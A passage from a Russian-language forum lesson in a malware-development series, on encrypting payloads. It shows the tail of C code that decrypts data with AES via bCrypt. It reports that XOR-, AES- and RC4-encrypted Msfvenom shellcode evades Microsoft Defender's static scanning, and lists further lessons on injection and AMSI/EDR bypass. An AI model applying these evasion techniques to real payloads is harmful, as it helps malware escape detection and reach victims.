+    DWORD    dwPlainSize = NULL;
+
+    // Decrypting
+    if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &amp;pPlaintext, &amp;dwPlainSize)) {
+        return -1;
+    }
+
+    // Printing the decrypted data to the screen in hex format
+    PrintHexData(&quot;PlainText&quot;, pPlaintext, dwPlainSize);
+
+    // this will print: &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
+    printf(&quot;Data: %s \n&quot;, pPlaintext);
+
+    // Clean up
+    HeapFree(GetProcessHeap(), 0, pPlaintext);
+    system(&quot;PAUSE&quot;);
+    return 0;
+}</code></pre>
+	</div>
+</div><br />
+<div class="bbImageWrapper  js-lbImage" title="1746773620567.png"
+		data-src="https://osint42.org/attachments/1746773620567-png.73/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773620567-png.73/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773620567.png"
+			title="1746773620567.png"
+			width="1429" height="775" loading="lazy" />
+	</div><br />
+<br />
+<b>Недостатки библиотеки bCrypt</b><br />
+<br />
+Одним из основных недостатков использования описанного выше метода для реализации шифрования AES является то, что использование криптографических функций WinAPI приводит к их появлению в таблице импорта адресов (IAT) бинарного файла.<br />
+<br />
+Решения  безопасности могут обнаруживать использование криптографических функций, сканируя IAT, что может потенциально указывать на вредоносное поведение или вызвать подозрения.<br />
+Скрытие WinAPI в IAT возможно и будет обсуждаться в следующих статьях.<br />
+<br />
+На изображении ниже показана IAT бинарного файла, использующего Windows API для шифрования AES. Использование библиотеки crypt.dll и криптографических функций явно видно.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773639033.png"
+		data-src="https://osint42.org/attachments/1746773639033-png.74/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773639033-png.74/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773639033.png"
+			title="1746773639033.png"
+			width="1902" height="945" loading="lazy" />
+	</div><br />
+<br />
+<span style="color: rgb(184, 49, 47)"><b><u><span style="font-size: 22px">Обход статического анализа Microsoft Defender</span></u></b></span><br />
+<br />
+Пример использования алгоритмов шифрования XOR, RC4 и AES для обхода статического анализатора Microsoft Defender.<br />
+На этом этапе учебного модуля полезная нагрузка (payload) не выполняется, она просто выводится на консоль. Поэтому в этом модуле основное внимание уделяется исключительно обходу статического анализа и сигнатурному обнаружению.<br />
+<br />
+Каждый из примеров кода использует шелл-код Msfvenom.<br />
+<br />
+<b>Необработанный шелл-код (Raw Shellcode)</b> - обнаружен Defender&#039;ом.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773651095.png"
+		data-src="https://osint42.org/attachments/1746773651095-png.75/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773651095-png.75/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773651095.png"
+			title="1746773651095.png"
+			width="1358" height="669" loading="lazy" />
+	</div><br />
+<br />
+<b>XOR-шифрованный шелл-код</b> - успешно обходит Defender.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773659154.png"
+		data-src="https://osint42.org/attachments/1746773659154-png.76/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773659154-png.76/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773659154.png"
+			title="1746773659154.png"
+			width="1777" height="998" loading="lazy" />
+	</div><br />
+<br />
+<b>AES-шифрованный шелл-код</b> - успешно обходит Defender.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773667064.png"
+		data-src="https://osint42.org/attachments/1746773667064-png.77/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773667064-png.77/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773667064.png"
+			title="1746773667064.png"
+			width="1747" height="869" loading="lazy" />
+	</div><br />
+<br />
+<b>RC4-шифрованный шелл-код </b>- успешно обходит Defender.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773674642.png"
+		data-src="https://osint42.org/attachments/1746773674642-png.78/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773674642-png.78/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773674642.png"
+			title="1746773674642.png"
+			width="1656" height="898" loading="lazy" />
+	</div></div>
+					
+										
+
+					
+						<div style="padding-top: 10px;">
+							
+														
+									<dl class="blockStatus blockStatus--info blockStatus--standalone">
+										<dt></dt>
+										<dd class="blockStatus-message amsNextPage">
+											<span class="">Следующая страница цикла:</span>
+											<a href="../obfuskatsiya-payload.11/index.html" class="" title="Обфускация Payload">Обфускация Payload</a>
+										</dd>
+									</dl>
+								
+
+								
+
+														
+									<dl class="blockStatus blockStatus--info blockStatus--standalone">
+										<dt></dt>
+										<dd class="blockStatus-message amsPreviousPage">
+											<span class="">Предыдущая статья цикла:</span>
+											<a href="../kuda-klast-nagruzku.9/index.html" class="" title="Куда класть нагрузку ?">Куда класть нагрузку ?</a>
+										</dd>
+									</dl>
+								
+							
+
+							
+						</div>
+					
+
+					
+						
+
+						
+					
+
+					
+
+					<div class="reactionsBar js-reactionsList ">
+						
+					</div>
+
+					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
+				</article>
+			</div>
+		</div>
+	</div>
+	
+	
+</div>
+
+
+
+
+
+
+
+
+
+
+	<div class="columnContainer"
+		data-xf-init="lightbox"
+		data-lb-id="article-6"
+		data-lb-universal="0">
+
+		<span class="u-anchorTarget" id="comments"></span>
+
+		<div class="columnContainer-comments">
+			
+	
+	
+
+	<div class="block block--messages"
+		data-xf-init=""
+		data-type="ams_comment"
+		data-href="/inline-mod/">
+
+		
+	
+	
+
+
+		<div class="block-outer"></div>
+		
+		<div class="block-container"
+			data-xf-init="select-to-quote"
+			data-message-selector=".js-comment">
+			
+			<h3 class="block-header">Комментарии</h3>
+			<div class="block-body js-replyNewCommentContainer">
+				
+					<span class="u-anchorTarget" id="comments"></span>
+					
+						
+							
+	
+	
+
+	<article class="message message--simple message--comment js-comment js-inlineModContainer"
+		data-author="vivty"
+		data-content="ams-comment-25"
+		id="js-comment-25">
+
+		<span class="u-anchorTarget" id="ams-comment-25"></span>
+
+		<div class="message-inner">
+			<div class="message-cell message-cell--user">
+				
+	<header class="message-user"
+		
+		itemscope itemtype="https://schema.org/Person"
+		itemid="https://osint42.org/members/vivty.94/">
+
+		
+			<meta itemprop="name" content="vivty" />
+			
+				<meta itemprop="url" content="https://osint42.org/members/vivty.94/" />
+			
+		
+
+		<div class="message-avatar">
+			<div class="message-avatar-wrapper">
+				<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--s avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
+			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
+		</a>
+			</div>
+		</div>
+		<span class="message-userArrow"></span>
+	</header>
+
+			</div>
+			<div class="message-cell message-cell--main">
+				<div class="js-quickEditTarget">
+					<div class="message-content js-messageContent">
+						<header class="message-attribution message-attribution--plain">
+							<ul class="listInline listInline--bullet">
+								<li class="message-attribution-user">
+									<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--xxs avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
+			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
+		</a>
+									<h4 class="attribution"><a href="https://osint42.org/members/vivty.94/" class="username " dir="auto" data-user-id="94" data-xf-init="member-tooltip"><span class="username--style2">vivty</span></a></h4>
+								</li>
+								<li>
+									<a href="../../../comments/25/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-12T18:12:34+0300" data-timestamp="1749741154" data-date="12.06.2025" data-time="18:12" data-short="12 Июн" title="12.06.2025 в 18:12">12.06.2025</time></a>
+								</li>
+							</ul>
+						</header>
+
+						
+						
+						
+
+						<div class="message-userContent lbContainer js-lbContainer"
+							data-lb-id="ams-comment-25"
+							data-lb-caption-desc="vivty &middot; 12.06.2025 в 18:12">
+
+							<article class="message-body js-selectToQuote">
+								<div class="bbWrapper">Отличные статьи.<br />
+Спасибо!</div>
+								<div class="js-selectToQuoteEnd">&nbsp;</div>
+							</article>
+
+							
+						</div>
+
+						
+
+						
+							
+	
+
+						
+					</div>
+
+					<footer class="message-footer">
+						
+
+						<div class="reactionsBar js-reactionsList ">
+							
+						</div>
+					</footer>
+
+					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
+				</div>
+			</div>
+		</div>
+	</article>
+
+						
+					
+						
+							
+	
+	
+
+	<article class="message message--simple message--comment js-comment js-inlineModContainer"
+		data-author="HMCoba"
+		data-content="ams-comment-27"
+		id="js-comment-27">
+
+		<span class="u-anchorTarget" id="ams-comment-27"></span>
+
+		<div class="message-inner">
+			<div class="message-cell message-cell--user">
+				
+	<header class="message-user"
+		
+		itemscope itemtype="https://schema.org/Person"
+		itemid="https://osint42.org/members/hmcoba.102/">
+
+		
+			<meta itemprop="name" content="HMCoba" />
+			
+				<meta itemprop="url" content="https://osint42.org/members/hmcoba.102/" />
+			
+		
+
+		<div class="message-avatar">
+			<div class="message-avatar-wrapper">
+				<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--s" data-user-id="102" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897" srcset="/data/avatars/m/0/102.jpg?1756734897 2x" alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" itemprop="image" /> 
+		</a>
+			</div>
+		</div>
+		<span class="message-userArrow"></span>
+	</header>
+
+			</div>
+			<div class="message-cell message-cell--main">
+				<div class="js-quickEditTarget">
+					<div class="message-content js-messageContent">
+						<header class="message-attribution message-attribution--plain">
+							<ul class="listInline listInline--bullet">
+								<li class="message-attribution-user">
+									<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--xxs" data-user-id="102" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897"  alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" /> 
+		</a>
+									<h4 class="attribution"><a href="https://osint42.org/members/hmcoba.102/" class="username " dir="auto" data-user-id="102" data-xf-init="member-tooltip"><span class="username--style2">HMCoba</span></a></h4>
+								</li>
+								<li>
+									<a href="../../../comments/27/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-16T14:27:08+0300" data-timestamp="1750073228" data-date="16.06.2025" data-time="14:27" data-short="16 Июн" title="16.06.2025 в 14:27">16.06.2025</time></a>
+								</li>
+							</ul>
+						</header>
+
+						
+						
+						
+
+						<div class="message-userContent lbContainer js-lbContainer"
+							data-lb-id="ams-comment-27"
+							data-lb-caption-desc="HMCoba &middot; 16.06.2025 в 14:27">
+
+							<article class="message-body js-selectToQuote">
+								<div class="bbWrapper">Отличный заход в тему Red Team. <br />
+Такие статьи важны для практического понимания атакующих техник. <br />
+Акцент на MDLC и реальное применение - то, чего часто не хватает. <br />
+Буду следить за серией.</div>
+								<div class="js-selectToQuoteEnd">&nbsp;</div>
+							</article>
+
+							
+						</div>
+
+						
+
+						
+							
+	
+		
+			<aside class="message-signature">
+			
+				<div class="bbWrapper">HMCoba</div>
+			
+			</aside>
+		
+	
+
+						
+					</div>
+
+					<footer class="message-footer">
+						
+
+						<div class="reactionsBar js-reactionsList is-active">
+							
+	
+	
+		<ul class="reactionSummary">
+		
+			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
+		
+		</ul>
+	
+
+
+<span class="u-srOnly">Реакции:</span>
+<a class="reactionsBar-link" href="../../../comments/27/reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>Marat</bdi></a>
+						</div>
+					</footer>
+
+					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
+				</div>
+			</div>
+		</div>
+	</article>
+
+						
+					
+				
+			</div>
+		</div>
+
+		<div class="block-outer block-outer--after">
+			
+			
+		</div>
+
+		
+	
+	
+
+	</div>
+
+	
+	
+	
+
+	
+
+
+		</div>
+	</div>	
+
+
+
+	
+
+
+
+		
+
+
+
+
+
+
+
+	
+
+
+
+	
+
+
+
+
+	
+</div>
+					
+				</div>
+
+				
+					<div class="p-body-sidebar">
+						
+						
+							<div class="block">
+			<div class="block-container">
+				<h3 class="block-header">ОГЛАВЛЕНИЕ</h3>
+				<div class="block-body">
+					<a class="blockLink " href="../../index.html">
+						
+							Зачем изучать разработку вредоносных программ ?
+						
+					</a>
+
+					
+						<a href="../instrumenty.1/index.html" class="blockLink ">
+							 Инструменты</a>
+					
+						<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="blockLink ">
+							 Так какой-же язык выбрать !?</a>
+					
+						<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="blockLink ">
+							 Шпаргалка по архитектуре винды</a>
+					
+						<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="blockLink ">
+							 Что такое payload и shell code</a>
+					
+						<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="blockLink ">
+							 Изучаем динамические библиотеки</a>
+					
+						<a href="../protsessy-windows.7/index.html" class="blockLink ">
+							 Процессы Windows</a>
+					
+						<a href="../vidy-detektov.8/index.html" class="blockLink ">
+							 Виды детектов</a>
+					
+						<a href="../kuda-klast-nagruzku.9/index.html" class="blockLink ">
+							 Куда класть нагрузку ?</a>
+					
+						<a href="index.html" class="blockLink is-selected">
+							 Шифруем Payload</a>
+					
+						<a href="../obfuskatsiya-payload.11/index.html" class="blockLink ">
+							 Обфускация Payload</a>
+					
+						<a href="../lokal-nyi-zapusk-payload.12/index.html" class="blockLink ">
+							 Локальный запуск Payload</a>
+					
+						<a href="../in-yektsiya-v-protsess.13/index.html" class="blockLink ">
+							 Иньекция в процесс</a>
+					
+						<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="blockLink ">
+							 Инъекция шелл-кода в процесс</a>
+					
+						<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="blockLink ">
+							 Размещаем Payload удаленно на сервере</a>
+					
+						<a href="../pryachem-payload-v-reyestre.16/index.html" class="blockLink ">
+							 Прячем Payload в реестре</a>
+					
+						<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="blockLink ">
+							 Разборка с цифровой подписью зверька</a>
+					
+						<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="blockLink ">
+							 Изучаем технику Thread Hijacking</a>
+					
+						<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="blockLink ">
+							 Определение PID нужного процесса, или перечисления процессов</a>
+					
+						<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="blockLink ">
+							 Изучаем технику APC Injection</a>
+					
+						<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="blockLink ">
+							 Вызов кода через функции обратного вызова</a>
+					
+						<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="blockLink ">
+							 Инъекция отображаемой памяти</a>
+					
+						<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="blockLink ">
+							 Изучаем технику Stomping Injection</a>
+					
+						<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="blockLink ">
+							 Контроль выполнения полезной нагрузки</a>
+					
+						<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="blockLink ">
+							 Изучаем технику Spoofing</a>
+					
+						<a href="../skrytiye-strok.26/index.html" class="blockLink ">
+							 Скрытие строк</a>
+					
+						<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="blockLink ">
+							 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
+					
+						<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="blockLink ">
+							 Кунгфу-2.Изучаем API Hooking</a>
+					
+						<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="blockLink ">
+							 Предельная техника. Разборка с сисколами</a>
+					
+						<a href="../predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="blockLink ">
+							 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
+					
+						<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="blockLink ">
+							 Черпаем силы в антиотладке</a>
+					
+						<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="blockLink ">
+							 Обход виртуальных машин</a>
+					
+						<a href="../otkryvayem-vrata-ada.33/index.html" class="blockLink ">
+							 Открываем врата ада</a>
+					
+						<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="blockLink ">
+							 Уменьшение вероятности детекта зверька</a>
+					
+						<a href="../obkhod-windows-defender.35/index.html" class="blockLink ">
+							 Обход Windows defender</a>
+					
+						<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="blockLink ">
+							 Про Endpoint Detection and Response (EDR)</a>
+					
+						<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="blockLink ">
+							 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
+					
+						<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="blockLink ">
+							 Огромная база исходников современных вирусов для разных платформ</a>
+					
+						<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="blockLink ">
+							 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
+					
+						<a href="../obkhod-amsi.40/index.html" class="blockLink ">
+							 Обход AMSI</a>
+					
+						<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="blockLink ">
+							 Обход AMSI при помощи хардварных точек останова</a>
+					
+						<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="blockLink ">
+							 Уклоняемся от поведенческого детекта антивируса и EDR</a>
+					
+						<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="blockLink ">
+							 Обходим антивирусы и EDR</a>
+					
+						<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="blockLink ">
+							 MutationGate - Новый подход работы с сисколами</a>
+					
+						<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="blockLink ">
+							 Разработка настоящего вируса в 2024 году</a>
+					
+
+					
+						<a href="../../index9401.html?full=1" class="blockLink ">Просмотреть всю статью</a>
+					
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+		<div class="block-container">
+			<h3 class="block-minorHeader">Информация о статье</h3>
+			<div class="block-body block-row block-row--minor">
+				<dl class="pairs pairs--justified">
+					<dt>Автор</dt>
+					
+						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
+					
+				</dl>
+				
+					<dl class="pairs pairs--justified">
+						<dt>Просмотры</dt>
+						<dd>9 577</dd>
+					</dl>
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Комментарии</dt>
+						<dd>2</dd>
+					</dl>
+				
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Последнее обновление</dt>
+						<dd><time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time></dd>
+					</dl>
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</div>
+						
+							<div class="block">
+			<div class="block-container">
+				<h3 class="block-minorHeader"><a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">Больше в Уроки разработки вредоносного софта</a></h3>
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.
+
+Вот...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../unichtozhayem-signaturnyye-antivirusy.57/index.html">Уничтожаем сигнатурные антивирусы</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно такие тулзы были популярны, возможно и сейчас будет находкой, кто занимается...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/index.html">Скрытое управление компьютером на Windows, адовая статья</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Статья не новая, нашел на старом форуме, но не плохо описано всё.
+
+Возможно какие-то команды...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - Загрузка DLL из ОЗУ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно писал свой загрузчик DLL, но сейчас на гитхабе наткнулся на более взрослый...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../pro-botnet-i-kak-delat-nel-zya.16/index.html">Про ботнет и как делать нельзя</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно участвовал в конкурсе статей на xss.is, мы решили для конкурса сделать ботнет...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+			<div class="block-container">
+				
+					<h3 class="block-minorHeader"><a href="../../../authors/0x42.1/index.html">Больше от 0x42</a></h3>
+				
+
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Недавно решил поддержать проект TOR, решил поднять middle relay.
+
+Напомню, что для поддержки...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				---
+
+## 🔹 Оглавление
+
+[1. Философия UNIX: «Everything is a file»]
+[2. Как работает VFS — Virtual...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../../../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+				<div class="block-container">
+					
+						<h3 class="block-minorHeader">Поделиться этой страницей статьи</h3>
+						
+							<div class="block-body block-row block-row--separated">
+								
+									
+
+	
+
+	
+		
+
+		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
+			<span class="u-anchorTarget" id="_xfUid-1-1758965527"></span>
+
+			
+
+			<div class="shareButtons-buttons">
+				
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965527" data-href="mailto:?subject={title}&amp;body={url}">
+							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
+							<span>Электронная почта</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965527"
+							data-xf-init="web-share"
+							data-title="" data-text="" data-url=""
+							data-hide=".shareButtons-button:not(.shareButtons-button--share)">
+
+							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
+							<span>Поделиться</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965527" data-clipboard="{url}">
